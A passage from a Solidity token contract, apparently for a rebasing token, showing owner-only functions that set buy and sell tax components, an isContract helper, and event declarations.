        _buyTax = _buyLiquidity.add(_buyMarketing).add(_buyRewards).add(_buyDevFee);
    }

    function setSellTax(uint _liq, uint _marketing, uint _Reward, uint _dev) public onlyOwner {
        _sellLiquidity = _liq;
        _sellMarketing = _marketing;
        _sellRewards = _Reward;
        _sellDevFee = _dev;
        _sellTax = _sellLiquidity.add(_sellMarketing).add(_sellRewards).add(_sellDevFee);
    }

    function isContract(address account) public view returns (bool) {
        return account.code.length > 0;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event LogRebase(uint256 indexed epoch, uint256 totalSupply);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);


}